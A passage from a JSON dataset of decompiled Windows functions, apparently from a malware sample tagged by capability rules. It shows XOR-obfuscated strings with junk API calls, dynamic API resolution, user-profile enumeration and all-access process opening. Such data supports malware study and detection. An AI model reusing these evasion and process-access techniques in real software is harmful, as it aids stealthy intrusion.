{
    "00401560": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.00401560(uint param_1)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int16_t *piVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    code *pcVar9;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar7 = 0;\n    var_4h = 0;\n    var_8h = 0;\n    var_18h = 0;\n    iVar2 = fcn.00401000(&var_8h);\n    if (iVar2 != 0) {\n        iVar2 = (*_sym.imp.SHLWAPI.dll_StrDupW)(param_1);\n        var_14h = iVar2;\n        var_10h = fcn.00404132();\n        pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (var_10h != 0) {\n            var_2ch = 0x32385848;\n            var_28h = 0x58004c27;\n            var_24h._0_2_ = 0x3251;\n            var_20h = 0x32515866;\n            var_1ch._0_2_ = 0x4c49;\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar8 = iVar7;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n                iVar2 = var_14h;\n                iVar7 = var_18h;\n                if (iVar5 != 0xc5f328) {\n                    var_ch = 6;\n                    *(iVar8 + piVar4) = *(&var_20h + iVar8 % 6) ^ (iVar8 + piVar4)[&var_2ch - piVar4];\n                }\n                iVar8 = iVar8 + 1;\n            } while (iVar8 < 10);\n            piVar6 = piVar4;\n            do {\n                iVar1 = *piVar6;\n                *((var_10h - piVar4) + piVar6) = iVar1;\n                pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                piVar6 = piVar6 + 1;\n            } while (iVar1 != 0);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        iVar8 = fcn.0040dd0b(var_8h);\n        if (iVar8 == 0) {\n            iVar8 = fcn.0040110c();\n            if (iVar8 != 0) {\n                iVar7 = 1;\n            }\n        }\n        if (iVar2 != 0) {\n            uVar3 = (*pcVar9)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        uVar3 = (*pcVar9)(0, var_4h);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return iVar7;\n}\n",
        "token_count": 822
    },
    "004022e6": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004022e6(void)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    uint uVar3;\n    int16_t *piVar4;\n    uchar *puVar5;\n    uint *puVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    uint *puVar12;\n    uint32_t uVar13;\n    code *pcVar14;\n    int16_t *piVar15;\n    uint lpFindFileData;\n    uint lpString1;\n    uint *lpMem;\n    int32_t var_d0h;\n    int32_t var_cch;\n    int32_t var_c8h;\n    int32_t var_c4h;\n    uint var_c0h;\n    int32_t lpString2;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_adh;\n    uint var_a9h;\n    uint var_a5h;\n    uint var_a1h;\n    uint var_9dh;\n    uint var_99h;\n    uint var_95h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    int32_t hFindFile;\n    uchar *ARG_0;\n    int16_t *var_60h;\n    uint var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    uint var_50h;\n    uchar *lpFileName;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    int32_t dwBytes;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.USERENV.dll_GetProfilesDirectoryW;\n    var_c0h = 0;\n    ARG_0 = NULL;\n    dwBytes = 0;\n    (*_sym.imp.USERENV.dll_GetProfilesDirectoryW)(0, &dwBytes);\n    pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (dwBytes != 0) {\n        dwBytes = dwBytes + 10;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, dwBytes * 2);\n        piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        var_60h = piVar4;\n        uVar3 = (*pcVar14)(8, dwBytes * 2);\n        lpFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        if (piVar4 != NULL) {\n            uVar3 = (*pcVar14)(8, 0x208);\n            puVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            puVar6 = &lpFindFileData;\n            ARG_0 = puVar5;\n            for (iVar10 = 0x250; piVar4 = var_60h,  iVar10 != 0; iVar10 = iVar10 + -1) {\n                *puVar6 = 0;\n                puVar6 = puVar6 + 1;\n            }\n            for (iVar10 = 0x208; iVar10 != 0; iVar10 = iVar10 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            puVar5 = lpFileName;\n            for (iVar10 = dwBytes * 2; iVar10 != 0; iVar10 = iVar10 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            piVar15 = var_60h;\n            for (iVar10 = dwBytes * 2; iVar10 != 0; iVar10 = iVar10 + -1) {\n                *piVar15 = 0;\n                piVar15 = piVar15 + 1;\n            }\n            iVar10 = (*pcVar2)(var_60h, &dwBytes);\n            if (iVar10 != 0) {\n                iVar10 = lpFileName - piVar4;\n                do {\n                    iVar1 = *piVar4;\n                    *(piVar4 + iVar10) = iVar1;\n                    piVar4 = piVar4 + 1;\n                } while (iVar1 != 0);\n                var_58h = 0x611a622f;\n                var_54h = 0x62595378;\n                var_50h._0_2_ = 0x6130;\n                var_8h = 0x61306273;\n                var_4h._0_2_ = 0x5356;\n                uVar3 = (*pcVar14)(8, 0x15);\n                puVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                var_48h = 6;\n                iVar10 = 0;\n                lpMem = puVar6;\n                do {\n                    iVar7 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n                    if (iVar7 != 0x3e6662) {\n                        *(iVar10 + puVar6) = *(&var_8h + iVar10 % var_48h) ^ (iVar10 + puVar6)[&var_58h - puVar6];\n                    }\n                    pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    iVar10 = iVar10 + 1;\n                    puVar12 = puVar6;\n                } while (iVar10 < 10);\n                do {\n                    iVar1 = *puVar12;\n                    puVar12 = puVar12 + 2;\n                } while (iVar1 != 0);\n                uVar13 = puVar12 - puVar6;\n                puVar12 = lpFileName + -2;\n                do {\n                    piVar4 = puVar12 + 2;\n                    puVar12 = puVar12 + 2;\n                } while (*piVar4 != 0);\n                for (uVar11 = uVar13 >> 2; uVar11 != 0; uVar11 = uVar11 - 1) {\n                    *puVar12 = *puVar6;\n                    puVar6 = puVar6 + 1;\n                    puVar12 = puVar12 + 1;\n                }\n                for (uVar13 = uVar13 & 3; uVar13 != 0; uVar13 = uVar13 - 1) {\n                    *puVar12 = *puVar6;\n                    puVar6 = puVar6 + 1;\n                    puVar12 = puVar12 + 1;\n                }\n                hFindFile = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(lpFileName, &lpFindFileData);\n                if (hFindFile != -1) {\n                    var_5ch = 0x47626567;\n                    var_70h = 0x47626549;\n                    var_6ch._0_2_ = 0x7976;\n                    var_78h = 0x4a477a76;\n                    var_74h._0_2_ = 0x6658;\n                    var_80h = 0x4a697a58;\n                    var_7ch._0_2_ = 0x6658;\n                    var_c8h = 5;\n                    do {\n                        uVar3 = (*pcVar14)(8, 9);\n                        iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                        iVar7 = 0;\n                        lpString2 = iVar10;\n                        var_44h = &var_5ch - iVar10;\n                        do {\n                            iVar8 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n                            if (iVar8 != 0xcac770) {\n                                *(iVar7 + iVar10) = *(&var_70h + iVar7 % var_48h) ^ (iVar7 + iVar10)[&var_5ch - iVar10];\n                            }\n                            iVar7 = iVar7 + 1;\n                        } while (iVar7 < 4);\n                        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n                        iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                        iVar7 = 0;\n                        var_d0h = iVar10;\n                        var_44h = &var_78h - iVar10;\n                        do {\n                            iVar9 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n                            iVar8 = lpString2;\n                            if (iVar9 != 0x4bdb5) {\n                                *(iVar7 + iVar10) = *(&var_80h + iVar7 % var_48h) ^ (iVar7 + iVar10)[&var_78h - iVar10];\n                            }\n                            iVar7 = iVar7 + 1;\n                        } while (iVar7 < 6);\n                        iVar7 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(&lpString1, lpString2);\n                        pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                        if (((iVar7 != 0) &&\n                            (iVar7 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(&lpString1, iVar10),  iVar7 != 0)) &&\n                           ((lpFindFileData & 0x10) != 0)) {\n                            var_38h = 0x3123537d;\n                            var_34h = 0x5350770a;\n                            var_30h = 0x77493120;\n                            var_2ch = 0x31295362;\n                            var_28h = 0x5345771d;\n                            var_24h = 0x77073125;\n                            var_20h = 0x313f5356;\n                            var_1ch = 0x53657735;\n                            var_18h = 0x77043129;\n                            var_14h = 0x314c5341;\n                            var_88h = 0x314c5331;\n                            var_84h._0_2_ = 0x7769;\n                            uVar3 = (*pcVar14)(8, 0x51);\n                            iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                            iVar7 = 0;\n                            var_44h = iVar10;\n                            var_10h = &var_38h - iVar10;\n                            do {\n                                iVar8 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n                                if (iVar8 != 0x1f55ab) {\n                                    *(iVar7 + iVar10) =\n                                         *(&var_88h + iVar7 % var_48h) ^ (iVar7 + iVar10)[&var_38h - iVar10];\n                                }\n                                iVar7 = iVar7 + 1;\n                            } while (iVar7 < 0x28);\n                            var_b8h = 0x4b254b00;\n                            var_b4h._0_2_ = 0x3334;\n                            var_b4h._2_1_ = 5;\n                            stack0xffffff4b = 0x304b344b;\n                            var_adh = 0x94b2033;\n                            var_a9h = 0x2e33084b;\n                            var_a5h = 0x254b364b;\n                            var_a1h = 0x94b2d33;\n                            var_9dh = 0x2433104b;\n                            var_99h = 0x344b384b;\n                            var_95h._0_2_ = 0x4133;\n                            var_95h._2_1_ = 0x4b;\n                            var_90h = 0x4b554b41;\n                            var_8ch._0_2_ = 0x3344;\n                            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x4d);\n                            iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                            iVar7 = 0;\n                            var_cch = iVar10;\n                            var_10h = &var_b8h - iVar10;\n                            do {\n                                iVar8 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n                                if (iVar8 != 0x11748) {\n                                    *(iVar7 + iVar10) =\n                                         *(&var_90h + iVar7 % var_48h) ^ (iVar7 + iVar10)[&var_b8h - iVar10];\n                                }\n                                iVar7 = iVar7 + 1;\n                            } while (iVar7 < 0x26);\n                            var_54h = var_44h;\n                            var_10h = 0;\n                            var_8h = 0x4b585147;\n                            var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x39);\n                            pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                            var_58h = iVar10;\n                            do {\n                                var_40h = 0x4b2b5162;\n                                var_3ch = 0x58744765;\n                                var_38h = 0x511b3938;\n                                var_34h = 0x474a4b7d;\n                                var_30h = 0x393e580d;\n                                var_2ch = 0x4b325136;\n                                var_28h = 0x583a475a;\n                                var_24h = 0x5120392e;\n                                var_20h = 0x47514b2d;\n                                var_1ch = 0x3965583d;\n                                var_18h = 0x4b355133;\n                                var_14h = 0x58514749;\n                                uVar3 = (*pcVar14)(8, 0x61);\n                                iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                                iVar7 = 0;\n                                var_c4h = &var_40h - iVar10;\n                                do {\n                                    iVar8 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n                                    puVar5 = ARG_0;\n                                    if (iVar8 != 0x177d8a) {\n                                        *(iVar7 + iVar10) =\n                                             *(&var_8h + iVar7 % var_c8h) ^ (iVar7 + iVar10)[&var_40h - iVar10];\n                                    }\n                                    iVar7 = iVar7 + 1;\n                                } while (iVar7 < 0x30);\n                                (*_sym.imp.USER32.dll_wsprintfW)\n                                          (ARG_0, iVar10, var_60h, &lpString1, (&var_58h)[var_10h]);\n                                iVar7 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(puVar5);\n                                pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                                if (iVar7 != -1) {\n                                    fcn.0040e0ae();\n                                    var_c0h = 1;\n                                }\n                                uVar3 = (*pcVar14)(0, iVar10);\n                                pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n                                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                                var_10h = var_10h + 1;\n                            } while (var_10h < 2);\n                            uVar3 = (*pcVar14)(0, var_cch);\n                            (*pcVar2)(uVar3);\n                            uVar3 = (*pcVar14)(0, var_44h);\n                            (*pcVar2)(uVar3);\n                            iVar10 = var_d0h;\n                            iVar8 = lpString2;\n                        }\n                        uVar3 = (*pcVar14)(0, iVar10);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                        uVar3 = (*pcVar14)(0, iVar8);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                        iVar10 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(hFindFile, &lpFindFileData);\n                    } while (iVar10 != 0);\n                }\n                (*_sym.imp.KERNEL32.dll_FindClose)(hFindFile);\n                uVar3 = (*pcVar14)(0, lpMem);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                piVar4 = var_60h;\n            }\n        }\n        if (lpFileName != NULL) {\n            uVar3 = (*pcVar14)(0, lpFileName);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        if (piVar4 != NULL) {\n            uVar3 = (*pcVar14)(0, piVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        if (ARG_0 != NULL) {\n            uVar3 = (*pcVar14)(0, ARG_0);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n    }\n    return var_c0h;\n}\n",
        "token_count": 3907
    },
    "004041e5": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004041e5(uint param_1, uchar *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uchar *puVar8;\n    uint *puVar9;\n    uchar *puVar10;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint32_t var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uchar *var_28h;\n    code *var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint hObject;\n    uint *var_ch;\n    int32_t lpLibFileName;\n    uint dwBytes;\n    \n    puVar9 = &var_78h;\n    var_28h = param_2;\n    for (iVar6 = 0x18; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_48h = *0x41cd98;\n    var_44h = 0;\n    dwBytes = 0;\n    var_18h = 0;\n    var_40h = 0x2723235b;\n    var_3ch = 0x2b331b59;\n    var_38h._0_2_ = 0x3527;\n    var_34h = 0x4b475735;\n    var_30h._0_1_ = 0x35;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_ch = 0x5;\n    iVar7 = 0;\n    lpLibFileName = iVar6;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        if (iVar3 != 0xf36b49) {\n            *(iVar7 + iVar6) = *(&var_34h + iVar7 % var_ch) ^ (iVar7 + iVar6)[&var_40h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    var_58h = 0x130b101d;\n    var_54h = 0x15173820;\n    var_50h = 0x2520002b;\n    var_4ch = CONCAT22(var_4ch._2_2_, 0x6734);\n    var_3ch = 0x63446747;\n    var_38h._0_2_ = 0x5645;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xf);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_24h = 0x6;\n    iVar7 = 0;\n    var_34h = iVar6;\n    var_20h = &var_58h - iVar6;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetDoubleClickTime)();\n        iVar3 = lpLibFileName;\n        if (iVar4 != 0xbc7bba) {\n            *(iVar7 + iVar6) = *(&var_3ch + iVar7 % var_24h) ^ (iVar7 + iVar6)[&var_58h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xe);\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    var_78h = 0x18;\n    var_74h = 0;\n    var_6ch = 0;\n    var_70h = 0;\n    var_68h = 0;\n    var_64h = 0;\n    iVar7 = (*pcVar5)(&var_14h, 0x400, &var_78h, &var_48h);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (-1 < iVar7) {\n        var_5ch = 0x4427440d;\n        var_58h = 0x1a633931;\n        var_54h = 0x4032375b;\n        var_50h = 0x3c3b601b;\n        var_4ch = var_4ch & 0xff000000 | 0x340656;\n        var_20h = 0x34683357;\n        var_1ch._0_1_ = 0x54;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar7 = 0;\n        var_2ch = iVar6;\n        var_24h = &var_5ch - iVar6;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n            iVar3 = lpLibFileName;\n            if (iVar4 != 0x597bff) {\n                *(iVar7 + iVar6) = *(&var_20h + iVar7 % var_ch) ^ (&var_5ch - iVar6)[iVar7 + iVar6];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0x13);\n        uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n        pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        iVar7 = (*pcVar5)(var_14h, 8, &hObject);\n        pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (-1 < iVar7) {\n            var_60h = 0x2c61402c;\n            var_5ch = 0x794e0455;\n            var_58h = 0x45195637;\n            var_54h = 0x1f44385d;\n            var_50h = 0x5f0d5e58;\n            var_4ch = 0x595e521d;\n            var_3ch = 0x59303776;\n            var_38h._0_2_ = CONCAT11(var_38h._1_1_, 0x30);\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n            iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            iVar7 = 0;\n            var_24h = &var_60h - iVar6;\n            var_20h = iVar6;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_CloseClipboard)();\n                iVar3 = lpLibFileName;\n                if (iVar4 != 0x3207a4) {\n                    *(iVar7 + iVar6) = *(&var_3ch + iVar7 % var_ch) ^ (iVar7 + iVar6)[&var_60h - iVar6];\n                }\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 0x18);\n            uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n            var_24h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n            (*var_24h)(hObject, 1, 0, 0, &dwBytes);\n            pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, dwBytes);\n            var_ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            if (var_ch != NULL) {\n                iVar7 = (*var_24h)(hObject, 1, var_ch, dwBytes, &dwBytes);\n                if (-1 < iVar7) {\n                    puVar8 = *var_ch;\n                    puVar10 = var_28h;\n                    for (iVar6 = 0x1c; iVar6 != 0; iVar6 = iVar6 + -1) {\n                        *puVar10 = *puVar8;\n                        puVar8 = puVar8 + 1;\n                        puVar10 = puVar10 + 1;\n                    }\n                    var_18h = 1;\n                    iVar6 = var_20h;\n                    iVar3 = lpLibFileName;\n                }\n                uVar2 = (*pcVar5)(0, var_ch);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n            uVar2 = (*pcVar5)(0, iVar6);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            iVar6 = var_2ch;\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(var_14h);\n        uVar2 = (*pcVar5)(0, iVar6);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        iVar6 = var_34h;\n    }\n    uVar2 = (*pcVar5)(0, iVar6);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar5)(0, iVar3);\n    (*pcVar1)(uVar2);\n    return var_18h;\n}\n",
        "token_count": 2301
    },
    "004078d6": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004078d6(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpModuleName;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_24h = 0x2723235b;\n    var_20h = 0x2b331b59;\n    var_1ch._0_2_ = 0x3527;\n    var_18h = 0x4b475735;\n    var_14h._0_2_ = CONCAT11(var_14h._1_1_, 0x35);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_24h - iVar2;\n    lpModuleName = iVar2;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        if (iVar3 != 0xf36b49) {\n            var_4h = 5;\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % 5) ^ (iVar7 + iVar2)[var_8h];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    var_28h = 0x130b101d;\n    var_24h = 0x15173820;\n    var_20h = 0x2520002b;\n    var_1ch._0_2_ = 0x6734;\n    var_18h = 0x63446747;\n    var_14h._0_2_ = 0x5645;\n    uVar1 = (*pcVar5)(8, 0xf);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_28h - iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetDoubleClickTime)();\n        iVar3 = lpModuleName;\n        if (iVar4 != 0xbc7bba) {\n            var_8h = 6;\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % 6) ^ (iVar7 + iVar2)[&var_28h - iVar2];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xe);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, iVar2);\n    uVar1 = (*pcVar5)(var_10h, 0x1f0fff, arg_8h, arg_ch);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*pcVar5)(uVar6);\n    return uVar1;\n}\n",
        "token_count": 850
    },
    "00407a57": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00407a57(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t in_ECX;\n    uint *in_EDX;\n    int32_t iVar6;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_1ch;\n    uint var_18h;\n    uint *var_14h;\n    int32_t lpModuleName;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    _var_28h = 0;\n    var_14h = in_EDX;\n    var_4h = in_ECX;\n    if (in_ECX == -1) {\n        var_8h = 1;\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        var_4h = fcn.00407a0e();\n    }\n    if (*0x41ccc0 == NULL) {\n        var_34h = 0x2723235b;\n        var_30h = 0x2b331b59;\n        var_2ch._0_2_ = 0x3527;\n        var_1ch = 0x4b475735;\n        var_18h._0_2_ = CONCAT11(var_18h._1_1_, 0x35);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar6 = 0;\n        lpModuleName = iVar3;\n        var_ch = &var_34h - iVar3;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetShellWindow)();\n            if (iVar4 != 0xf36b49) {\n                var_ch = 5;\n                *(iVar6 + iVar3) = *(&var_1ch + iVar6 % 5) ^ (iVar6 + iVar3)[&var_34h - iVar3];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 10);\n        var_50h = 0x57190430;\n        var_4ch = 0x215e453c;\n        var_48h = 0x252f592b;\n        var_44h = 0x4d3a0103;\n        var_40h = 0x16271f2a;\n        var_3ch = 0xa395723;\n        var_38h._0_2_ = 0x475c;\n        var_38h._2_1_ = 0x4e;\n        var_1ch = 0x384e736a;\n        var_18h._0_2_ = 0x734b;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1c);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar6 = 0;\n        var_ch = &var_50h - iVar3;\n        do {\n            iVar5 = (*_sym.imp.USER32.dll_DestroyCaret)();\n            iVar4 = lpModuleName;\n            if (iVar5 != 0x2e2d7a) {\n                var_ch = 6;\n                *(iVar6 + iVar3) = *(&var_1ch + iVar6 % 6) ^ (iVar6 + iVar3)[&var_50h - iVar3];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 0x1b);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar3);\n        *0x41ccc0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        var_28h = 0;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n        pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n        (*pcVar1)(uVar2);\n        iVar3 = var_4h;\n        in_EDX = var_14h;\n        if (*0x41ccc0 == NULL) goto code_r0x00407bfb;\n    }\n    iVar3 